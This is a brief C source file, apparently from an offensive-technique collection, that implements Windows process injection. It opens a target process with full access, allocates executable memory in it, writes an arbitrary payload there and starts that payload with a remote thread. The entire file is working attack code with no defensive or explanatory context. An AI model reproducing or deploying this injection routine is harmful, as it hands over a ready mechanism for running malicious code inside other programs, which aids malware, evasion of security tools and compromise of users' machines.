// 🔴 Process Injection (Windows)
#include <windows.h>
#include <stdio.h>

int inject_to_process(DWORD pid, unsigned char* payload, SIZE_T payload_size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) return -1;
    
    // Allocate memory in target process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, payload_size, 
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteMemory == NULL) {
        CloseHandle(hProcess);
        return -1;
    }
    
    // Write payload
    WriteProcessMemory(hProcess, pRemoteMemory, payload, payload_size, NULL);
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}